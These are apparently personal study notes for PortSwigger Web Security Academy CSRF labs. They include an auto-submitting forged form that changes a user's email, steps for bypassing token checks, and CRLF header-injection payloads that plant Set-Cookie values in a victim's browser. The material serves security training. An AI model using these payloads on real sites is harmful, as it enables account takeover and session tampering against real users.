

```
### CSRF Vulnerabilities
```

```
### CSRF General
```

```
### CSRF Lab Apprentice:

#1. Lab: CSRF vulnerability with no defenses
> Engagement tools -> Generate CSRF PoC -> Copy URL
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

```
### CSRF Lab Practitioner


#2. Lab: CSRF where token validation depends on request method:
> Change from Post to Get to bypass token validation
> Engagement tools -> Generate CSRF PoC -> Copy URL -> Attack!





#3. Lab: CSRF where token validation depends on token being present
> Delete CSRF and observer that the request is now accepted
> Engagement tools -> Generate CSRF PoC -> Copy URL -> Attack!


#4. Lab: CSRF where token is not tied to user session:
> Intercept the value of CSRF token of the request.
> Drop the request
>  Observe that if you swap the CSRF token with the value from the other account, then the request is accepted. 



#5. Lab: CSRF where token is tied to non-session cookie
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
> Create a URL that uses this vulnerability to inject your csrfKey cookie into the victim's browser:
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
> <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">



#6. Lab: CSRF where token is duplicated in cookie
> Per convalidare il CSRF, viene semplicemente verificato che sia uguale al csrf Cookie, pertanto si puÃ² tentare di iniettare un csrf cookie in modo da ricopiare il token CSRF
> Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser:
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
> <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>

```

```
### CSRF Lab Expert
```

```
### XXX Lab Extra
```